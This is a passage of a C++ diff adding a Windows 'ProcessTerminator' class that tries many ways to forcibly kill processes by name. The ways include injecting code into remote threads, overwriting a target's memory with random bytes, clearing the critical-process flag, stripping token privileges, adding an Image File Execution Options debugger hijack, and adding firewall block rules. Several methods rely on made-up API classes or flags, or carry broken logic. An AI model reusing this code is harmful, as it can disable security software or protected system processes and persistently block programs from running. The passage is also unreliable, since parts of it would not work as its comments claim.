+                static_cast<PROCESS_INFORMATION_CLASS>(52), // ProcessFaultToleranceInformation
+                &faultTolerance,
+                sizeof(faultTolerance)
+            );
+
+            if (NT_SUCCESS(status)) {
+                // 注入一个会导致异常的指令
+                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                if (pRemoteCode) {
+                    // 写入会导致除零异常的指令
+                    BYTE faultCode[] = {
+                        0x33, 0xC0,    // xor eax, eax
+                        0xF7, 0xF0,    // div eax (除零异常)
+                        0xC3           // ret
+                    };
+
+                    WriteProcessMemory(hProcess, pRemoteCode, faultCode, sizeof(faultCode), NULL);
+
+                    // 创建远程线程执行异常代码
+                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+                        (LPTHREAD_START_ROUTINE)pRemoteCode,
+                        NULL, 0, NULL);
+                    if (hThread) {
+                        WaitForSingleObject(hThread, 1000);
+                        CloseHandle(hThread);
+                    }
+
+                    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+                }
+
+                // 尝试正常终止
+                bool result = TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                if (result) return true;
+            }
+
+            CloseHandle(hProcess);
+        }
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+
+// 方法4: 通过进程活动调节终止进程
+bool ProcessTerminator::terminateByProcessActivityModeration(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess || hProcess == INVALID_HANDLE_VALUE) continue;
+
+            // [v5.3 跨版本兼容] 使用进程活动调节API限制进程活动
+            //   SetProcessInformation 是 Win8+ 函数, 用 GetProcAddress 动态加载
+            static auto pSetProcessInformation =
+                reinterpret_cast<FnSetProcessInformation>(
+                    GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "SetProcessInformation"));
+            if (pSetProcessInformation) {
+                PROCESS_ACTIVITY_MODERATION activityModeration = { 0 };
+                activityModeration.Version = PROCESS_ACTIVITY_MODERATION_CURRENT_VERSION;
+                activityModeration.Flags = PROCESS_ACTIVITY_MODERATION_ENABLE;
+                activityModeration.ExemptionTimeMs = 0; // 无豁免时间
+
+                if (pSetProcessInformation(hProcess, ProcessActivityModeration, &activityModeration, sizeof(activityModeration))) {
+                    // 将进程活动限制到最低
+                    activityModeration.ExemptionTimeMs = 1; // 最小豁免时间
+                    pSetProcessInformation(hProcess, ProcessActivityModeration, &activityModeration, sizeof(activityModeration));
+
+                    // 等待一段时间让进程因活动受限而停止响应
+                    std::this_thread::sleep_for(std::chrono::milliseconds(500));
+
+                    // 尝试终止进程
+                    bool result = TerminateProcess(hProcess, 0);
+                    CloseHandle(hProcess);
+                    if (result) return true;
+                }
+            }
+
+            CloseHandle(hProcess);
+        }
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+
+// 方法5: 通过基于虚拟化的安全性终止进程
+bool ProcessTerminator::terminateByProcessVirtualizationBasedSecurity(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        if (!initNativeAPI()) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess || hProcess == INVALID_HANDLE_VALUE) continue;
+
+            // 使用基于虚拟化的安全性API隔离进程
+            PROCESS_VIRTUALIZATION_BASED_SECURITY vbsInfo = { 0 };
+            vbsInfo.Flags = PROCESS_VIRTUALIZATION_BASED_SECURITY_ENABLE;
+
+            NTSTATUS status = NtSetInformationProcess(
+                hProcess,
+                static_cast<PROCESS_INFORMATION_CLASS>(61), // ProcessVirtualizationBasedSecurity
+                &vbsInfo,
+                sizeof(vbsInfo)
+            );
+
+            if (NT_SUCCESS(status)) {
+                // 将进程完全隔离
+                vbsInfo.Flags |= PROCESS_VIRTUALIZATION_BASED_SECURITY_ISOLATION;
+                NtSetInformationProcess(
+                    hProcess,
+                    static_cast<PROCESS_INFORMATION_CLASS>(61),
+                    &vbsInfo,
+                    sizeof(vbsInfo)
+                );
+
+                // 尝试终止被隔离的进程
+                bool result = TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                if (result) return true;
+            }
+
+            CloseHandle(hProcess);
+        }
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+bool ProcessTerminator::terminateByTaskManagerMethod(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        auto startTime = std::chrono::steady_clock::now();
+        auto endTime = startTime + std::chrono::seconds(6);
+
+        // 循环6秒尝试终止进程
+        while (std::chrono::steady_clock::now() < endTime) {
+            for (int pid : pids) {
+                HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+                if (hProcess) {
+                    // 尝试正常终止
+                    if (TerminateProcess(hProcess, 0)) {
+                        CloseHandle(hProcess);
+                        std::wcout << L"成功终止进程: " << processName.c_str() << L" (PID: " << pid << L")" << std::endl;
+                        return true;
+                    }
+                    CloseHandle(hProcess);
+                }
+            }
+
+            // 检查进程是否还存在
+            if (!isProcessRunning(processName)) {
+                return true;
+            }
+
+            // 等待一小段时间再尝试
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        }
+
+        // 如果6秒后进程仍然存在，尝试强制终止
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 使用更强制的方法
+                StripProcessPrivileges(hProcess); // 剥夺权限
+
+                // 再次尝试终止
+                if (TerminateProcess(hProcess, 0)) {
+                    CloseHandle(hProcess);
+                    std::wcout << L"强制终止进程: " << processName.c_str() << L" (PID: " << pid << L")" << std::endl;
+                    return true;
+                }
+                CloseHandle(hProcess);
+            }
+        }
+
+        return !isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+// WMI方法实现
+bool ProcessTerminator::terminateByWMI(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        HRESULT hres;
+
+        // 初始化COM
+        hres = CoInitializeEx(0, COINIT_MULTITHREADED);
+        if (FAILED(hres)) return false;
+
+        // 设置COM安全级别
+        hres = CoInitializeSecurity(
+            NULL,
+            -1,
+            NULL,
+            NULL,
+            RPC_C_AUTHN_LEVEL_NONE,
+            RPC_C_IMP_LEVEL_IMPERSONATE,
+            NULL,
+            EOAC_NONE,
+            NULL
+        );
+
+        // 创建WMI定位器
+        IWbemLocator* pLoc = NULL;
+        hres = CoCreateInstance(
+            CLSID_WbemLocator,
+            NULL,
+            CLSCTX_INPROC_SERVER,
+            IID_IWbemLocator,
+            (LPVOID*)&pLoc
+        );
+
+        if (FAILED(hres)) {
+            CoUninitialize();
+            return false;
+        }
+
+        // 连接到WMI
+        IWbemServices* pSvc = NULL;
+        hres = pLoc->ConnectServer(
+            _bstr_t(L"ROOT\\CIMV2"),
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            NULL,
+            &pSvc
+        );
+
+        if (FAILED(hres)) {
+            pLoc->Release();
+            CoUninitialize();
+            return false;
+        }
+
+        // 设置代理安全级别
+        hres = CoSetProxyBlanket(
+            pSvc,
+            RPC_C_AUTHN_WINNT,
+            RPC_C_AUTHZ_NONE,
+            NULL,
+            RPC_C_AUTHN_LEVEL_CALL,
+            RPC_C_IMP_LEVEL_IMPERSONATE,
+            NULL,
+            EOAC_NONE
+        );
+
+        if (FAILED(hres)) {
+            pSvc->Release();
+            pLoc->Release();
+            CoUninitialize();
+            return false;
+        }
+
+        // 执行WMI查询
+        IEnumWbemClassObject* pEnumerator = NULL;
+
+        // 将多字节字符串转换为宽字符字符串
+        std::wstring wideProcessName = MultiByteToWide(processName);
+        std::wstring query = L"SELECT * FROM Win32_Process WHERE Name = '" + wideProcessName + L"'";
+
+        hres = pSvc->ExecQuery(
+            bstr_t(L"WQL"),
+            bstr_t(query.c_str()),
+            WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
+            NULL,
+            &pEnumerator
+        );
+
+        if (FAILED(hres)) {
+            pSvc->Release();
+            pLoc->Release();
+            CoUninitialize();
+            return false;
+        }
+
+        // 遍历结果并终止进程
+        IWbemClassObject* pclsObj = NULL;
+        ULONG uReturn = 0;
+        bool result = false;
+
+        while (pEnumerator) {
+            HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
+            if (0 == uReturn) break;
+
+            VARIANT vtProp;
+            hr = pclsObj->Get(L"Handle", 0, &vtProp, NULL, NULL);
+            if (SUCCEEDED(hr)) {
+                int pid = _wtoi(vtProp.bstrVal);
+                result = terminateByPID(pid) || result;
+                VariantClear(&vtProp);
+            }
+
+            pclsObj->Release();
+        }
+
+        // 清理
+        pSvc->Release();
+        pLoc->Release();
+        pEnumerator->Release();
+        CoUninitialize();
+
+        return result;
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+// 辅助函数实现
+std::vector<int> ProcessTerminator::getPIDsByName(const std::string& processName) {
+    std::vector<int> pids;
+
+#ifdef _WIN32
+    try {
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot == INVALID_HANDLE_VALUE) return pids;
+
+        PROCESSENTRY32 pe;
+        pe.dwSize = sizeof(PROCESSENTRY32);
+
+        if (Process32First(hSnapshot, &pe)) {
+            do {
+                // 转换为多字节字符串进行比较
+                char exeFile[MAX_PATH];
+                WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, exeFile, MAX_PATH, NULL, NULL);
+
+                if (_stricmp(exeFile, processName.c_str()) == 0) {
+                    pids.push_back(pe.th32ProcessID);
+                }
+            } while (Process32Next(hSnapshot, &pe));
+        }
+
+        CloseHandle(hSnapshot);
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#else
+    try {
+        DIR* dir = opendir("/proc");
+        if (!dir) return pids;
+
+        dirent* entry;
+        while ((entry = readdir(dir)) != nullptr) {
+            if (entry->d_type == DT_DIR) {
+                std::string dirName = entry->d_name;
+                if (std::all_of(dirName.begin(), dirName.end(), ::isdigit)) {
+                    int pid = std::stoi(dirName);
+                    std::string path = "/proc/" + dirName + "/cmdline";
+                    FILE* file = fopen(path.c_str(), "r");
+                    if (file) {
+                        char cmdline[256];
+                        if (fgets(cmdline, sizeof(cmdline), file)) {
+                            std::string processCmd = cmdline;
+                            size_t pos = processCmd.find_last_of('/');
+                            if (pos != std::string::npos) {
+                                processCmd = processCmd.substr(pos + 1);
+                            }
+                            if (processCmd == processName) {
+                                pids.push_back(pid);
+                            }
+                        }
+                        fclose(file);
+                    }
+                }
+            }
+        }
+        closedir(dir);
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+
+    return pids;
+}
+
+bool ProcessTerminator::enableDebugPrivilege() {
+#ifdef _WIN32
+    try {
+        HANDLE hToken;
+        TOKEN_PRIVILEGES tp;
+        LUID luid;
+
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+            return false;
+        }
+
+        if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
+            CloseHandle(hToken);
+            return false;
+        }
+
+        tp.PrivilegeCount = 1;
+        tp.Privileges[0].Luid = luid;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
+            CloseHandle(hToken);
+            return false;
+        }
+
+        CloseHandle(hToken);
+        return GetLastError() == ERROR_SUCCESS;
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return true; // 在Linux上不需要此功能
+#endif
+}
+
+bool ProcessTerminator::isProcessCritical(int pid) {
+#ifdef _WIN32
+    try {
+        HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_QUERY_INFORMATION); 
+        if (!hProcess) return false;
+
+        DWORD bytesReturned;
+        BOOL isCritical = FALSE;
+        // 使用正确的类型转换
+        if (NT_SUCCESS(NtQueryInformationProcess(hProcess,
+            static_cast<PROCESS_INFORMATION_CLASS>(29), // ProcessBreakOnTermination
+            &isCritical,
+            sizeof(isCritical),
+            &bytesReturned))) {
+            CloseHandle(hProcess);
+            return isCritical;
+        }
+
+        CloseHandle(hProcess);
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+
+bool ProcessTerminator::isProcessRunning(const std::string& processName) {
+    try {
+        return !getPIDsByName(processName).empty();
+    }
+    catch (...) {
+    }
+}
+
+bool ProcessTerminator::terminateByCriticalProcessFlag(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 移除关键进程标志 - 使用正确的类型转换
+                ULONG breakOnTermination = 0;
+                NTSTATUS status = NtSetInformationProcess(hProcess,
+                    static_cast<PROCESS_INFORMATION_CLASS>(29), // ProcessBreakOnTermination
+                    &breakOnTermination, sizeof(breakOnTermination));
+
+                // 现在尝试终止进程
+                bool result = TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                if (result) return true;
+            }
+        }
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+
+bool ProcessTerminator::terminateByProcessIsolation(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        // 创建一个新的作业对象来隔离进程
+        HANDLE hJob = CreateJobObject(NULL, NULL);
+        if (!hJob) return false;
+
+        JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = { 0 };
+        jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION;
+
+        SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli));
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                AssignProcessToJobObject(hJob, hProcess);
+                CloseHandle(hProcess);
+            }
+        }
+
+        // 触发一个未处理的异常来终止进程
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 写入一个会导致异常的指令
+                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                if (pRemoteCode) {
+                    BYTE exceptionCode[] = { 0xCC }; // INT 3 - 断点异常
+                    WriteProcessMemory(hProcess, pRemoteCode, exceptionCode, sizeof(exceptionCode), NULL);
+
+                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
+                    if (hThread) {
+                        WaitForSingleObject(hThread, INFINITE);
+                        CloseHandle(hThread);
+                    }
+
+                    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+                }
+                CloseHandle(hProcess);
+            }
+        }
+
+        CloseHandle(hJob);
+        return true;
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByMemoryCorruption(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 获取进程内存信息
+                MEMORY_BASIC_INFORMATION mbi;
+                LPVOID address = 0;
+                SIZE_T bytesRead;
+
+                while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
+                    if (mbi.State == MEM_COMMIT && mbi.Protect != PAGE_NOACCESS) {
+                        // 尝试破坏内存内容
+                        std::vector<BYTE> buffer(mbi.RegionSize);
+                        for (size_t i = 0; i < buffer.size(); i++) {
+                            buffer[i] = rand() % 256;
+                        }
+
+                        WriteProcessMemory(hProcess, address, buffer.data(), buffer.size(), &bytesRead);
+                    }
+
+                    // 修复指针算术运算
+                    address = reinterpret_cast<LPVOID>(reinterpret_cast<DWORD_PTR>(mbi.BaseAddress) + mbi.RegionSize);
+                }
+
+                CloseHandle(hProcess);
+            }
+        }
+
+        // 尝试正常终止
+        return terminateByProcessName(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByHandleCloning(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            // 获取系统所有句柄信息
+            ULONG bufferSize = 0x10000;
+            PSYSTEM_HANDLE_INFORMATION_EX handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
+
+            while (NtQuerySystemInformation(16, handleInfo, bufferSize, NULL) == STATUS_INFO_LENGTH_MISMATCH) {
+                bufferSize *= 2;
+                free(handleInfo);
+                handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
+            }
+
+            // 查找目标进程的句柄
+            for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
+                SYSTEM_HANDLE handle = handleInfo->Information[i];
+
+                if (handle.ProcessId == pid && handle.ObjectTypeNumber == 0x5) { // 进程对象类型
+                    // 复制句柄
+                    HANDLE hDuplicate;
+                    if (DuplicateHandle(GetCurrentProcess(), (HANDLE)handle.Handle,
+                        GetCurrentProcess(), &hDuplicate,
+                        PROCESS_TERMINATE, FALSE, 0)) {
+                        // 使用复制的句柄终止进程
+                        TerminateProcess(hDuplicate, 0);
+                        CloseHandle(hDuplicate);
+                        free(handleInfo);
+                        return true;
+                    }
+                }
+            }
+
+            free(handleInfo);
+        }
+    }
+    catch (...) {
+        return false;
+    }
+#endif
+    return false;
+}
+
+bool ProcessTerminator::terminateByDesktopIsolation(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        // 创建一个新的桌面
+        HDESK hNewDesktop = CreateDesktop(L"TerminationDesktop", NULL, NULL, 0, DESKTOP_CREATEWINDOW, NULL);
+        if (!hNewDesktop) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // 将进程移动到新的桌面
+                HWND hWnd = NULL;
+                do {
+                    hWnd = FindWindowEx(NULL, hWnd, NULL, NULL);
+                    DWORD windowPid;
+                    GetWindowThreadProcessId(hWnd, &windowPid);
+
+                    if (windowPid == pid) {
+                        SetThreadDesktop(hNewDesktop);
+                        PostMessage(hWnd, WM_CLOSE, 0, 0);
+                    }
+                } while (hWnd != NULL);
+
+                CloseHandle(hProcess);
+            }
+        }
+
+        // 关闭桌面，这将终止所有关联的进程
+        CloseDesktop(hNewDesktop);
+        return true;
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByTokenPrivilegeRemoval(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_QUERY_INFORMATION);
+            if (hProcess) {
+                HANDLE hToken;
+                if (OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
+                    // 获取当前特权
+                    DWORD tokenInfoLength = 0;
+                    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &tokenInfoLength);
+
+                    if (tokenInfoLength > 0) {
+                        std::vector<BYTE> tokenPrivilegesBuffer(tokenInfoLength);
+                        if (GetTokenInformation(hToken, TokenPrivileges, tokenPrivilegesBuffer.data(), tokenInfoLength, &tokenInfoLength)) {
+                            TOKEN_PRIVILEGES* tokenPrivileges = (TOKEN_PRIVILEGES*)tokenPrivilegesBuffer.data();
+
+                            // 移除所有特权
+                            for (DWORD i = 0; i < tokenPrivileges->PrivilegeCount; i++) {
+                                tokenPrivileges->Privileges[i].Attributes = 0;
+                            }
+
+                            // 应用修改
+                            AdjustTokenPrivileges(hToken, FALSE, tokenPrivileges, tokenInfoLength, NULL, NULL);
+                        }
+                    }
+
+                    CloseHandle(hToken);
+                }
+                CloseHandle(hProcess);
+
+                // 现在进程没有特权，尝试终止
+                return terminateByPID(pid);
+            }
+        }
+    }
+    catch (...) {
+        return false;
+    }
+#endif
+    return false;
+}
+
+bool ProcessTerminator::terminateByRegistryModification(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        // 修改注册表以影响进程行为
+        HKEY hKey;
+        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+            // 为进程创建调试器键
+            HKEY hSubKey;
+            std::wstring wideProcessName = MultiByteToWide(processName);
+
+            if (RegCreateKeyEx(hKey, wideProcessName.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hSubKey, NULL) == ERROR_SUCCESS) {
+                // 设置调试器为cmd.exe，这将阻止进程启动
+                std::wstring debugger = L"cmd.exe /c taskkill /f /im " + wideProcessName;
+                RegSetValueEx(hSubKey, L"Debugger", 0, REG_SZ,
+                    reinterpret_cast<const BYTE*>(debugger.c_str()),
+                    static_cast<DWORD>((debugger.length() + 1) * sizeof(wchar_t)));
+
+                RegCloseKey(hSubKey);
+            }
+
+            RegCloseKey(hKey);
+        }
+
+        // 尝试终止现有进程
+        return terminateByProcessName(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByServiceControl(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        // 尝试将进程作为服务控制
+        SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+        if (!hSCManager) return false;
+
+        std::wstring wideProcessName = MultiByteToWide(processName);
+        SC_HANDLE hService = OpenService(hSCManager, wideProcessName.c_str(), SERVICE_ALL_ACCESS);
+
+        if (hService) {
+            // 停止服务
+            SERVICE_STATUS serviceStatus;
+            ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus);
+
+            CloseServiceHandle(hService);
+        }
+
+        CloseServiceHandle(hSCManager);
+
+        // 尝试终止进程
+        return terminateByProcessName(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByCOMObjectManipulation(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        // 初始化COM
+        CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+
+        for (int pid : pids) {
+            // 尝试通过COM接口终止进程
+            IWbemLocator* pLoc = NULL;
+            CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
+
+            if (pLoc) {
+                IWbemServices* pSvc = NULL;
+                pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
+
+                if (pSvc) {
+                    // 设置安全级别
+                    CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
+
+                    // 创建方法调用
+                    IWbemClassObject* pClass = NULL;
+                    pSvc->GetObject(_bstr_t(L"Win32_Process"), 0, NULL, &pClass, NULL);
+
+                    if (pClass) {
+                        IWbemClassObject* pInParamsDefinition = NULL;
+                        IWbemClassObject* pClassInstance = NULL;
+
+                        pClass->GetMethod(L"Terminate", 0, &pInParamsDefinition, NULL);
+
+                        if (pInParamsDefinition) {
+                            pInParamsDefinition->SpawnInstance(0, &pClassInstance);
+
+                            if (pClassInstance) {
+                                // 设置参数
+                                VARIANT var;
+                                var.vt = VT_I4;
+                                var.intVal = 0;
+                                pClassInstance->Put(L"Reason", 0, &var, 0);
+
+                                // 执行方法
+                                IWbemClassObject* pOutParams = NULL;
+                                pSvc->ExecMethod(_bstr_t(L"Win32_Process.Handle=\"" + _bstr_t(pid) + "\""), _bstr_t(L"Terminate"), 0, NULL, pClassInstance, &pOutParams, NULL);
+
+                                if (pOutParams) {
+                                    pOutParams->Release();
+                                }
+
+                                pClassInstance->Release();
+                            }
+
+                            pInParamsDefinition->Release();
+                        }
+
+                        pClass->Release();
+                    }
+
+                    pSvc->Release();
+                }
+
+                pLoc->Release();
+            }
+        }
+
+        CoUninitialize();
+
+        return !pids.empty();
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByNetworkIsolation(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        // 使用Windows防火墙API隔离进程
+        INetFwPolicy2* pFwPolicy = NULL;
+        HRESULT hr = CoCreateInstance(__uuidof(NetFwPolicy2), NULL, CLSCTX_INPROC_SERVER, __uuidof(INetFwPolicy2), (void**)&pFwPolicy);
+
+        if (SUCCEEDED(hr) && pFwPolicy) {
+            // 创建出bound规则阻止进程访问网络
+            INetFwRules* pFwRules = NULL;
+            pFwPolicy->get_Rules(&pFwRules);
+
+            if (pFwRules) {
+                INetFwRule* pFwRule = NULL;
+                hr = CoCreateInstance(__uuidof(NetFwRule), NULL, CLSCTX_INPROC_SERVER, __uuidof(INetFwRule), (void**)&pFwRule);
+
+                if (SUCCEEDED(hr) && pFwRule) {
+                    std::wstring wideProcessName = MultiByteToWide(processName);
+                    std::wstring ruleName = L"Block " + wideProcessName;
+
+                    // 使用BSTR正确转换字符串
+                    BSTR bstrRuleName = SysAllocString(ruleName.c_str());
+                    BSTR bstrAppName = SysAllocString(wideProcessName.c_str());
+
+                    pFwRule->put_Name(bstrRuleName);
+                    pFwRule->put_ApplicationName(bstrAppName);
+                    pFwRule->put_Action(NET_FW_ACTION_BLOCK);
+                    pFwRule->put_Enabled(VARIANT_TRUE);
+
+                    // 使用正确的枚举类型
+                    pFwRule->put_Direction(NET_FW_RULE_DIR_OUT);
+                    pFwRule->put_Protocol(NET_FW_IP_PROTOCOL_ANY);
+
+                    pFwRules->Add(pFwRule);
+
+                    // 释放BSTR
+                    SysFreeString(bstrRuleName);
+                    SysFreeString(bstrAppName);
+                    pFwRule->Release();
+                }
+
+                pFwRules->Release();
+            }
+
+            pFwPolicy->Release();
+        }
+
+        // 尝试终止进程
+        return terminateByProcessName(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+bool ProcessTerminator::terminateByPowerManagement(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                // [v5.3 跨版本兼容] 设置进程电源管理状态为节能模式
+                //   SetProcessInformation 是 Win8+ 函数, 用 GetProcAddress 动态加载
+                static auto pSetProcessInformation =
+                    reinterpret_cast<FnSetProcessInformation>(
+                        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "SetProcessInformation"));
+                if (pSetProcessInformation) {
+                    PROCESS_POWER_THROTTLING_STATE powerThrottling;
+                    powerThrottling.Version = PROCESS_POWER_THROTTLING_CURRENT_VERSION;
+                    powerThrottling.ControlMask = PROCESS_POWER_THROTTLING_EXECUTION_SPEED;
+                    powerThrottling.StateMask = PROCESS_POWER_THROTTLING_EXECUTION_SPEED;
+                    pSetProcessInformation(hProcess, ProcessPowerThrottling,
+                        &powerThrottling, sizeof(powerThrottling));
+                }
+
+                // 降低进程优先级
+                SetPriorityClass(hProcess, IDLE_PRIORITY_CLASS);
+
+                // 尝试终止进程
+                bool result = TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                if (result) return true;
+            }
+        }
+    }
+    catch (...) {
+        return false;
+    }
+#endif
+    return false;
+}
+
+bool ProcessTerminator::terminateByUIAutomation(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        // 使用UI自动化关闭进程窗口
+        for (int pid : pids) {
+            // 查找进程的所有窗口
+            HWND hWnd = NULL;
+            do {
+                hWnd = FindWindowEx(NULL, hWnd, NULL, NULL);
+
+                DWORD windowPid;
+                GetWindowThreadProcessId(hWnd, &windowPid);
+
+                if (windowPid == pid) {
+                    // 发送关闭消息
+                    PostMessage(hWnd, WM_CLOSE, 0, 0);
+
+                    // 等待窗口关闭
+                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
+
+                    // 如果窗口仍然存在，强制终止
+                    if (IsWindow(hWnd)) {
+                        PostMessage(hWnd, WM_QUIT, 0, 0);
+                    }
+                }
+            } while (hWnd != NULL);
+        }
+
